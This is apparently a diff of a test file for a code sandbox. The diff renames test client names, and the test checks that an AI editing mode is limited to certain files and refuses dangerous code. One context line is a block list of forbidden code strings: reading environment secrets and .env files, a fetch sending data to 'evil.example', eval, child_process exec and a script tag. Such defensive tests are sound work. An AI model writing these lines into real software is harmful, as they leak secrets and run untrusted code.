@@ -170,9 +170,9 @@ try {
   const codeBadText = ["const k = process.env.KEY", "require('fs').readFileSync('.env')", "fetch('https://evil.example/?d=' + data)", "eval(x)", "import { exec } from 'child_process'", "<script src=x></script>"];
   check("and the code still may not reach for env values, files, programs or outside sites", codeBadText.filter((x) => !code(["app/booking/actions.ts"], x)).length === 0, codeBadText.filter((x) => !code(["app/booking/actions.ts"], x)));
   check("a table on the usual rules still refuses server code", !!refuse(["app/api/slots/route.ts"]) && !!refuse(["app/booking/actions.ts"]));
-  const codeSystem = sandboxSystem({ client: "Daniel", table_name: "SAMS", scope: "code", blocked });
+  const codeSystem = sandboxSystem({ client: "Elena", table_name: "Kit Room", scope: "code", blocked });
   check("the copy's AI is told what it may change in the code mode, and the blocked list", /server code those pages use/.test(codeSystem) && codeSystem.includes("src/application/identity/") && /type-checks/.test(codeSystem));
-  check("and on the usual rules it is told screens only", /Change only what people see and click/.test(sandboxSystem({ client: "Daniel", table_name: "SAMS" })));
+  check("and on the usual rules it is told screens only", /Change only what people see and click/.test(sandboxSystem({ client: "Elena", table_name: "Kit Room" })));
 
   // ---- every kind the table can hand out has what the connection needs
   check("every kind has a schema, and every kind but the listener's and the plan's a task", ["answer", "view", "combine", "intro", "client", "work", "review", "look", "listen", "plan", "sandbox"].every((kind) => KINDS[kind]?.schema?.type === "object"), Object.keys(KINDS));
